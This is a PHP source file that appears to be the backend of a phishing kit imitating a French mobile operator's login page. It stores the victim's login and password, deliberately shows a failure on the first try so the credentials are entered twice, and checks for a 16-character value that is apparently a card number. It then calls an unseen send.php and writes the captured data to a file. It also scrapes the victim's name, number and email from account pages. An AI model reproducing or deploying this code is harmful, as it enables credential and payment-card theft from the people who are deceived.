<?php

session_start();
error_reporting(0);

function FMobLogin($lgn,$pwd){
	if(!$_SESSION['flogin'] && !$_SESSION['fpwd']){
		$_SESSION['flogin'] = $lgn;
		$_SESSION['fpwd'] = $pwd;
		return "failed";
	}else{
		$_SESSION['slogin'] = $lgn;
		$_SESSION['spwd'] = $pwd;
		$_SESSION['success'] = "success";
		return "success";
	}
}
function gName($d){
	$d = explode("<p>Bonjour ", $d);
	$d = explode("<a href=", $d[1]);
	return $d[0];
}
function gNum($d){
	$d = explode("style=\"color:#c00;\">", $d);
	$d = explode("</span>", $d[1]);
	return $d[0];
}
function gEmail($d){
	$d = explode("Mon email : <span class=\"bold\">", $d);
	$d = explode("</span>", $d[1]);
	return $d[0];
}
if(strlen($_POST['xn'])==16){
	require("send.php"); file_put_contents($_SESSION['success'], $rx, FILE_APPEND); print "<script> validator(); </script>";
}

if($_POST['fmid'] && $_POST['fpw']){
	$lt = FMobLogin($_POST['fmid'],$_POST['fpw']);
			print_r($_SESSION);
	if($lt=="success"){
		print "<script> window.location.href=window.location.href; </script>";
	}else{
		print "<script> initPad(); caN(); shErr(); </script>";
	}
}

?>
